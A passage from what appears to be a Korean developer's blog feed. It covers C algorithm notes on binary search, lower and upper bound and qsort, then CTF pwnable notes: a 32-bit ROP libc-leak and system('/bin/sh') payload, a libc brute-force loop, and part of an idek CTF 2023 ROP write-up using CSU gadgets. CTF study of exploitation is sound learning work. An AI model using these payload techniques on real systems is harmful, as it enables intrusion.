class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">upper_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt; data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>low</code>, <code>high</code>, <code>mid</code>는 모두 인덱스이다.</p><p><code>key</code>보다 큰 첫 번째 위치를 찾아야 한다. <code>key</code>가 <code>data[mid]</code>보다 작으면 <code>high</code>를 <code>mid</code>로 내린다. 그럼 전체적인 인덱스는 왼쪽으로 살짝 치우친 형태일 것이다.</p><p><code>key</code>가 <code>data[mid]</code>보다 값거나 크면 <code>low = mid + 1</code>을 수행한다. 쉽게 말해 <code>mid</code> 그 다음 인덱스를 <code>low</code>로 지정한다. </p><img src="/images/230201-algoritm-upper_lower/IMG_4027.png" width=500/><br><img src="/images/230201-algoritm-upper_lower/IMG_4028.png" width=500/><br><img src="/images/230201-algoritm-upper_lower/IMG_4029.png" width=500/><p>검정색을 먼저 읽고 빨간색을 읽으면 된다. 파란색은 참고이다.</p><h2 id="Example-백준-10816-숫자카드-2"><a href="#Example-백준-10816-숫자카드-2" class="headerlink" title="Example (백준 10816 숫자카드 2)"></a>Example (백준 10816 숫자카드 2)</h2><ul><li><a href="https://www.acmicpc.net/problem/10816">https://www.acmicpc.net/problem/10816</a></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span>*)a &gt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(<span class="type">int</span>*)a &lt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">lower_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt;= data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">upper_bound</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key &lt; data[mid]) </span><br><span class="line">            high = mid;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (data[high] == key) </span><br><span class="line">        <span class="keyword">return</span> high + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> high;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d &quot;</span>, &amp;arr[i]);</span><br><span class="line"></span><br><span class="line">    qsort(arr, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line">    <span class="type">int</span> brr[m];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d &quot;</span>, &amp;brr[i]);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// lower_bound, upper_bound</span></span><br><span class="line">    <span class="type">int</span> lower, upper;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">        lower = lower_bound(arr, n, brr[i]);</span><br><span class="line">        upper = upper_bound(arr, n, brr[i]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, upper-lower);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>이 문제를 풀기 위해서 <code>upper_bound</code> 함수에서 아래 조건을 추가해줘야한다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (data[high] == key) </span><br><span class="line">    <span class="keyword">return</span> high + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>왜냐하면.. <code>upper_bound</code> 함수의 반환 값은 key 값을 초과하는 첫 번째 값의 인덱스인데 key가 정렬에서 가장 큰 수라면 반환 값이 존재하지 않기 떄문이다. 그래서 n-1을 반환한다. 이 문제는 key의 개수를 알아내는 것이 목표이기 때문에 해당 경우에만 +1을 해줘야 한다. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10 20 30 30 30 </span><br></pre></td></tr></table></figure><p>예시로 위의 배열에서 30의 개수는 <code>5-2 = 3</code> 이어야 한다.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> binsearch </tag>
            
            <tag> Baekjoon </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Binary Search (C)</title>
      <link href="/230123-alrorithm-binsearch/"/>
      <url>/230123-alrorithm-binsearch/</url>
      
        <content type="html"><![CDATA[<ul><li>정렬된 배열에 대해 사용 가능</li></ul><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span>*)a &gt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(<span class="type">int</span>*)a &lt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">binsearch</span><span class="params">(<span class="type">int</span> data[], <span class="type">int</span> n, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> low, high, mid;</span><br><span class="line"></span><br><span class="line">    low = <span class="number">0</span>;</span><br><span class="line">    high = n<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high) &#123;</span><br><span class="line">        mid = (low+high) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (key == data[mid]) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (key &lt; data[mid]) high = mid<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (key &gt; data[mid]) low = mid+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, key;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    qsort(arr, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[j]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;key);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nfind key: %s\n&quot;</span>, binsearch(arr, n, key) ? <span class="string">&quot;Exist&quot;</span> : <span class="string">&quot;None&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>input</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">9 2 6 5 1 7 3 4 8 1</span><br><span class="line">5</span><br></pre></td></tr></table></figure><ul><li>output</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 1 2 3 4 5 6 7 8 9 </span><br><span class="line">find key: Exist</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> binsearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Quick sort (C, qsort)</title>
      <link href="/230123-algorithm-qsort/"/>
      <url>/230123-algorithm-qsort/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void qsort (void *base, size_t nel, size_t width, int (*compare)(const void *, const void *);</span><br></pre></td></tr></table></figure><ul><li><code>stdlib.h</code></li><li><code>O(nlogn)</code> (최악: <code>O(n^2)</code>)</li></ul><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a, <span class="type">const</span> <span class="type">void</span>* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span>*)a &gt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (*(<span class="type">int</span>*)a &lt; *(<span class="type">int</span>*)b) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="type">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    qsort(arr, n, <span class="keyword">sizeof</span>(<span class="type">int</span>), compare);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, arr[j]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>input</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">9 2 6 5 1 7 3 4 8 1</span><br></pre></td></tr></table></figure><ul><li>output</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 1 2 3 4 5 6 7 8 9</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
            <tag> qsort </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - 32bit ROP</title>
      <link href="/230119-pwn-32bitrop/"/>
      <url>/230119-pwn-32bitrop/</url>
      
        <content type="html"><![CDATA[<ul><li>x86 calling convention<ul><li>The caller places all arguments to the callee on the <code>stack</code></li><li>Arguments are pushed to the <code>stack</code></li><li>Stack cleanup is performed by the calle<br></li></ul></li><li>rip control</li><li><code>/bin/sh\x00</code> address</li><li>leak the libc address. (e.g <code>got</code>)</li><li>got overwriting</li><li>argument control? -&gt; <code>pop [reg] ; ret</code> gadget address (Role is to add <code>esp</code>)</li></ul><h2 id="Libc-Leak"><a href="#Libc-Leak" class="headerlink" title="Libc Leak"></a>Libc Leak</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x88</span>+<span class="number">0x4</span>) <span class="comment"># (dummy + ebp)</span></span><br><span class="line"></span><br><span class="line">payload += p32(e.plt[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(e.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) <span class="comment"># ret2main</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">leak = struct.unpack(<span class="string">&#x27;I&#x27;</span>, p.recv(<span class="number">4</span>))[<span class="number">0</span>] </span><br><span class="line">info(<span class="built_in">hex</span>(leak))</span><br></pre></td></tr></table></figure><h2 id="Execute-system-39-bin-sh-x00-39"><a href="#Execute-system-39-bin-sh-x00-39" class="headerlink" title="Execute system(&#39;/bin/sh\x00&#39;)"></a>Execute <code>system(&#39;/bin/sh\x00&#39;)</code></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># restart main</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x88</span>+<span class="number">0x4</span>) <span class="comment"># (dummy + ebp)</span></span><br><span class="line"></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input:\n&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 32bit </tag>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - libc brute forcing in local (p.libcs())</title>
      <link href="/230119-pwn-libc_brute_forcing_in_local/"/>
      <url>/230119-pwn-libc_brute_forcing_in_local/</url>
      
        <content type="html"><![CDATA[<ul><li>로컬에서 원하는 립시 주소 실행할 때까지 특정 바이트 브루트 포싱하기<ul><li><code>p.libcs()</code> 이용</li></ul></li><li>상황<ul><li>8바이트 중 상위 5바이트는 알고 있고, 하위 1.5바이트는 오프셋으로 알고 있는 상황. 하지만 중간 1.5바이트를 모르기 때문에 해당 부분 브루트 포싱이 필요함 -&gt; <code>0x7fb877 ??? b01</code></li></ul></li><li>장점<ul><li>정답인 주소만을 이용하여 페이로드를 전송하기 때문에 디버깅 시 유리함 (빠름)</li></ul></li></ul><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">repr</span>(p.libs())) <span class="comment"># print base</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(p.libs()[<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>] + <span class="number">0xe3b01</span>))</span><br><span class="line"></span><br><span class="line">        aslr = <span class="built_in">hex</span>(p.libs()[<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>] + <span class="number">0xe3b01</span>)[-<span class="number">6</span>:-<span class="number">3</span>] <span class="comment"># 0x7fb877 210 b01 -&gt; only get &#x27;210&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> aslr != <span class="string">&#x27;fff&#x27;</span>:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># exploit code here !!</span></span><br><span class="line">        <span class="comment"># break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><ul><li>출력 결과</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/vuln&#x27;</span>: 4190208, <span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/libc.so.6&#x27;</span>: 140430248431616, <span class="string">&#x27;/home/jir4vvit/ctf/idek/sprinter/ld-2.31.so&#x27;</span>: 140430250479616&#125;</span><br><span class="line">0x7fb877210b01</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>idek CTF 2023 - Typop (intend, CSU)</title>
      <link href="/230118-idekctf2023-typop2/"/>
      <url>/230118-idekctf2023-typop2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1839">https://ctftime.org/event/1839</a></li></ul><p>얼마 전에 올렸던 idek CTF에서의 Typop 문제를 언인텐으로 풀이했다는 것을 확인했다. ctftime 구경하다가 이 문제의 다른 풀이를 확인하면서 알게되었다. 당시엔 길이 제한 때문에 <code>csu gadget</code>을 사용 못한다고 생각했다. 하지만 쓸데 없는 페이로드가 있었고 이것만 없으면 길이가 딱 맞아서 <code>csu gadget</code>을 사용하여 <code>win</code> 함수를 실행할 수 있다.</p><p>이 문제에 대한 정보와 분석은 며칠 전 작성한 게시글을 확인하자.</p><ul><li><a href="https://jiravvit.github.io/230116-idekctf2023-typop/">https://jiravvit.github.io/230116-idekctf2023-typop/</a></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><h3 id="csu-int-csu-call"><a href="#csu-int-csu-call" class="headerlink" title="csu_int, csu_call"></a>csu_int, csu_call</h3><img src="/images/230118-idekctf2023-typop2/Screenshot 2023-01-18 at 17.17.11.png" width=700/><br><p>위 사진의 가젯을 사용하여 만든 함수는 아래와 같다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">chain</span>(<span class="params">rdi, rsi, rdx, buf, csu_call</span>):</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#payload += b&#x27;A&#x27; * 8        # add rsp, 8</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)           <span class="comment"># pop rbx (dummy)</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)           <span class="comment"># pop rbp (dummy)</span></span><br><span class="line">    payload += p64(rdi)         <span class="comment"># pop r12 -&gt; rdi</span></span><br><span class="line">    payload += p64(rsi)         <span class="comment"># pop r13 -&gt; rsi</span></span><br><span class="line">    payload += p64(rdx)         <span class="comment"># pop r14 -&gt; rdx    </span></span><br><span class="line">    payload += p64(buf)         <span class="comment"># pop r15 -&gt; call [buf]</span></span><br><span class="line">    payload += p64(csu_call)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><p>코드에 주석으로 표현되어 있는 부분이 바로 쓸데없는 페이로드이다. 이 문제에서 저 코드는 필요 없다.</p><p>한편, <code>csu gadget</code>을 사용하기 위해 가장 중요한 것은 call할 주소가 필요하다는 것이다. 사진의 코드에선 <code> call [r15+rbx*8]</code>가 여기에 해당한다. <code>rbx</code>를 0으로 세팅할 것이기 때문에 결국 <code>r15</code>에 저장된 주소가 호출된다. 우리가 실행하고 싶은 주소는 <code>win</code> 함수 주소이기 때문에 어딘가에다가 <code>win</code> 함수 주소를 적어놓고 그 주소를 <code>r15</code>에 넣어줘야 한다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(win)             <span class="comment"># stack addr</span></span><br><span class="line"></span><br><span class="line">payload += p64(csu_init)</span><br><span class="line">payload += chain(<span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;l&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>), stack-<span class="number">0x10</span>, csu_call)</span><br></pre></td></tr></table></figure><p><code>canary</code> 뒤에 